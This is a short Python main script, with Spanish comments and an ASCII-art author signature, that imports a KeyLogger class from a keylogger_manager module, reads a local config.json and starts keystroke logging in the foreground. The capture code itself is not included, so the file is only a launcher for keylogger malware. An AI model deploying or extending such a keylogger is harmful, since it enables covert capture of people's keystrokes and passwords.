
# Imports
from keylogger_manager import KeyLogger

# Main
def main():

    # Iniciar KeyLogger
    kl = KeyLogger(ruta_config="./config.json")
    kl.iniciar_primer_plano()

if __name__ == "__main__":
    main()

    #     \____/\
    #     /\  /\
    #    -byRyanAg...